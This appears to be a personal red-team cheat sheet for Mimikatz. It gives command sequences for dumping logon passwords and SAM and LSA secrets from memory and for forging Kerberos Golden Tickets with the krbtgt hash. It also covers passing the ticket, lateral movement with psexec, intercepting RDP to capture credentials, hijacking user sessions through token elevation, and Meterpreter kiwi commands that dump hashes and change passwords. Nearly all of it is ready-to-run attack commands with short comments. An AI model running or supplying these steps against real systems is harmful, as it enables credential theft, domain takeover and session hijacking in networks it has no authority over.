

# Overview

  - Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
  - Dumps credentials stored in memory.
  - Just a few attacks: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket


# Creds dumping

module to bypass memory protection
```
privilege::debug
```

```
sekurlsa::logonpasswords # logged in passwords
```
## *Sam dumping*
```
lsadump::sam # (to dump sam file)
lsadump::sam /patch
```
## *LSA dumping*
```
lsadump::lsa /patch # dumping lsa
```

# *Golden Ticket*

^cc25a7

```
privilege::debug
lsadump::lsa /inject /name:krbtgt # filter wanted user name

# Copy SID of the domain and kerberos NTLM hash

kerberos:golden /User:Administrator <or any name> /domain:DOMAIN /sid:<SID> /krbtgt:<NTLM_ _HASH> /id:500 /ptt # pass the ticket

/User: # could be anyname
/domain: # target domain
/sid: # domain sid
/krbtgt: # kerberos tgt ntlm hash
/id:500 # admin RID
/ptt: # pass the ticket 

misc::cmd # open command line with session we created


# acess other domain users 
command \\COMPUTER\SHARE or file
e.g.
psexec \\ESabah cmd.exe
 
```

# RDP 
**Overview:**
*As the attacker was able to gain the session of the machine, they used Mimikatz and ran the mstsc function inside the ts module. Mstsc is a process that runs when the Remote Desktop service in use. It then intercepts the RDP protocol communication to extract the stored credentials.*
**Attack:**
- Intercept RDP connection to steal creds 
```bash

privielge::debug # checks for my perm to run mimikatz
ts::mstsc # intercept connection to dump creds

```

## Session hijacking

```
privilege::debug # checks for my perm to run mimikatz
ts::sessions # list open sessions
token::elevate #  impersonate token
ts::remote /id:ID_NUMBER # steal session 
```

# On Metasploit

```ruby
# Through Meterpreter session
load kiwi

lsa_dump_sam         #  Dump LSA SAM (Dumps all system users hashes)
lsa_dump_secrets     # Dump LSA secrets (unparsed)
password_change     #   Change the password/hash of a user


```

---
Tags: #mimikatz #AD #hashdump #golden_ticket #silver_ticket #kerberos #pass-the-Ticket #Over-Pass-The-Hash #passhash 
Resources: [mimiKatz](https://github.com/gentilkiwi/mimikatz) 